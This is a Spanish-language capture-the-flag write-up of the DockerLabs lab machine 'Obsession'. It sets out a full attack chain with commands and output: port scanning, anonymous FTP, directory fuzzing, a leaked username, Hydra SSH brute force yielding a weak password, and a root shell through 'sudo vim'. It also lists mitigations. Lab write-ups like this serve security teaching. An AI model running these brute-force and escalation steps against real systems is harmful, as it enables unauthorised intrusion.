<h1 align="center">🎯 Obsession — Writeup</h1>

<p align="center">
  <img src="img/obsession.png" alt="Obsession" width="520">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Plataforma-DockerLabs-1f6feb?style=for-the-badge">
  <img src="https://img.shields.io/badge/Dificultad-Fácil-2ea043?style=for-the-badge">
  <img src="https://img.shields.io/badge/Privesc-sudo%20vim-d1242f?style=for-the-badge">
</p>

<p align="center">
  <b>Nmap</b> ➡️ <b>Enumeración web (Gobuster)</b> ➡️ <b>Fuga de usuario (/backup)</b> ➡️ <b>Fuerza bruta SSH (Hydra)</b> ➡️ <b>Escalada con sudo vim</b> ➡️ <b>Root</b>
</p>

---

## 📑 Índice
1. [Información de la máquina](#1-información-de-la-máquina)
2. [Reconocimiento](#2-reconocimiento)
3. [Enumeración web](#3-enumeración-web)
4. [Fuga de información — usuario](#4-fuga-de-información--usuario)
5. [Acceso — Fuerza bruta SSH](#5-acceso--fuerza-bruta-ssh)
6. [Escalada de privilegios](#6-escalada-de-privilegios)
7. [¿Por qué funciona?](#7-por-qué-funciona)
8. [Mitigaciones](#8-mitigaciones)
9. [Herramientas utilizadas](#9-herramientas-utilizadas)

---

## 1. Información de la máquina

| Campo            | Valor                                        |
|------------------|----------------------------------------------|
| Nombre           | Obsession                                    |
| Plataforma       | DockerLabs                                   |
| IP objetivo      | `172.17.0.2`                                 |
| Dificultad       | Fácil                                        |
| Vulnerabilidad   | Fuga de credenciales + contraseña débil + `sudo` mal configurado |
| Escalada         | GTFOBins — `sudo /usr/bin/vim`               |

> 📝 La IP varía según el despliegue del contenedor. Ajusta `172.17.0.2` a la que te asigne tu `auto_deploy.sh`.

---

## 2. Reconocimiento

Escaneo completo con Nmap:

```bash
sudo nmap -p- -sS -sC -sV -T5 -n -Pn -vvv 172.17.0.2
```

Puertos abiertos:

| Puerto   | Servicio | Versión                                   |
|----------|----------|-------------------------------------------|
| 21/tcp   | ftp      | vsftpd 3.0.5 (login anónimo permitido)    |
| 22/tcp   | ssh      | OpenSSH 9.6p1 Ubuntu                       |
| 80/tcp   | http     | Apache httpd 2.4.58 — *Russoski Coaching*  |

> 💡 El FTP permite acceso anónimo y el título del sitio web, *Russoski Coaching*, ya apunta a un posible nombre de usuario.

Comprobamos que no haya exploits conocidos para las versiones de los servicios:

```bash
searchsploit 'vsftpd 3.0.5'     # Sin resultados
searchsploit 'OpenSSH 9.6p1'    # Sin resultados
```

> ⚠️ Sin CVE directo en los servicios, el vector debe venir de la configuración / contenido expuesto, no de un exploit de versión.

### 2.1 FTP anónimo (contexto)

El `vsftpd` permite login anónimo, así que descargamos los dos ficheros expuestos:

```bash
ftp 172.17.0.2
# Name: anonymous   | Password: (vacío)
ftp> get chat-gonza.txt
ftp> get pendientes.txt
ftp> bye
```

`chat-gonza.txt` es una conversación entre los personajes *Russoski* y *Gonza* que menciona una "URL guardada en una ruta segura" (guiño a `/important/`). `pendientes.txt` es una lista de tareas; destaca el último punto:

```
4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros..
```

> 💡 Estos ficheros **no contienen credenciales**: son ambientación y pistas. El punto 4 de `pendientes.txt` es un *foreshadowing* directo de la escalada de privilegios (permisos `sudo` mal configurados). El camino técnico real continúa por la **web**.

---

## 3. Enumeración web

Fuzzing de directorios y ficheros con Gobuster:

```bash
gobuster dir -u http://172.17.0.2 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x html,php,txt,js --exclude-length 10701
```

Hallazgos:

```
index.html       (Status: 200)
backup           (Status: 301)  -> http://172.17.0.2/backup/
important        (Status: 301)  -> http://172.17.0.2/important/
server-status    (Status: 403)
```

> 💡 Un directorio llamado `/backup/` casi siempre merece una revisión manual: suele contener ficheros olvidados con información sensible.

Revisamos ambos directorios:

- **`/important/important.md`** → contiene el *"Manifiesto Hacker" (La Conciencia de un Hacker)*. Es puro texto de ambientación, **sin información explotable → rabbit hole**.
- **`/backup/`** → aquí está la fuga de información relevante (ver siguiente sección).

---

## 4. Fuga de información — usuario

Dentro de `/backup/` encontramos un fichero de texto plano:

```
http://172.17.0.2/backup/backup.txt
```

Contenido:

```
Usuario para todos mis servicios: russoski (cambiar pronto!)
```

> ✅ Usuario confirmado: **`russoski`**. Además, la nota ("usuario para **todos** mis servicios") sugiere **reutilización de credenciales**, por lo que ese usuario servirá también para el SSH.

---

## 5. Acceso — Fuerza bruta SSH

Con el usuario identificado, fuerza bruta dirigida con Hydra y `rockyou`:

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://172.17.0.2
```

Resultado:

```
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
1 of 1 target successfully completed, 1 valid password found
```

Nos conectamos por SSH:

```bash
ssh russoski@172.17.0.2
```

> ⚠️ Si el SSH avisa de *REMOTE HOST IDENTIFICATION HAS CHANGED* es porque la clave del contenedor cambió respecto a un despliegue anterior. Se soluciona limpiando la entrada antigua:
> ```bash
> ssh-keygen -f ~/.ssh/known_hosts -R 172.17.0.2
> ```

```
russoski@9aeb8deeafc7:~$ whoami
russoski
```

> ✅ Acceso como usuario `russoski` conseguido.

---

## 6. Escalada de privilegios

Revisamos qué puede ejecutar el usuario con `sudo`:

```bash
sudo -l
```

```
User russoski may run the following commands on 9aeb8deeafc7:
    (root) NOPASSWD: /usr/bin/vim
```

El usuario puede ejecutar **`vim` como root y sin contraseña**. `vim` figura en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo): permite lanzar una shell desde su interior, que hereda los privilegios con los que se ejecuta.

Explotación en una sola línea:

```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```

> ⚠️ Importante: al ser `NOPASSWD` hay que llamar directamente a `sudo /usr/bin/vim`. Usar `sudo -u root /bin/bash` falla porque **solo `vim`** está autorizado, no una shell directa.

Comprobamos el acceso root:

```bash
# whoami
root
```

> 🏆 **Máquina comprometida.** Acceso total como `root` mediante la escalada con `sudo vim`.

```bash
cat /root/*.txt 2>/dev/null
```

---

## 7. ¿Por qué funciona?

- **Fuga de credenciales:** un fichero `backup.txt` accesible públicamente en la web revela el nombre de usuario del sistema. La propia nota confirma la reutilización en "todos los servicios".
- **Contraseña débil:** `iloveme` está en diccionarios públicos como `rockyou`, lo que hace trivial la fuerza bruta contra el SSH.
- **`sudo` mal configurado:** permitir `vim` como root con `NOPASSWD` equivale a dar acceso root completo, ya que `vim` puede ejecutar comandos arbitrarios del sistema (`:!comando`). Cualquier binario con capacidad de escape a shell en `sudoers` es una escalada directa.

---

## 8. Mitigaciones

1. **No exponer ficheros sensibles** en el servidor web (`/backup/`, credenciales, notas internas). Restringir acceso y eliminar ficheros olvidados.
2. **No reutilizar credenciales** entre servicios y aplicar políticas de contraseñas robustas (nunca presentes en diccionarios).
3. **Revisar `sudoers`**: no conceder binarios que permitan escape a shell (`vim`, `nano`, `less`, `find`, etc.) con `NOPASSWD`. Si vim es necesario, usar `rvim` (modo restringido) o limitar la operación.
4. **Protección contra fuerza bruta** en SSH: `fail2ban`, autenticación por clave y `PasswordAuthentication no`.
5. **Deshabilitar el FTP anónimo** si no es imprescindible, y nunca almacenar ahí información útil para un atacante.

---

## 9. Herramientas utilizadas

- **Nmap** — escaneo de puertos y detección de servicios/versiones.
- **Searchsploit** — búsqueda de exploits conocidos para las versiones detectadas.
- **Gobuster** — enumeración de directorios y ficheros web.
- **Hydra** — fuerza bruta de credenciales SSH.
- **GTFOBins** — referencia para el escape a shell vía `sudo vim`.
- **rockyou** — diccionario de contraseñas.

---

<p align="center"><i>Writeup con fines educativos. Realizado en un entorno de laboratorio autorizado (DockerLabs).</i></p>
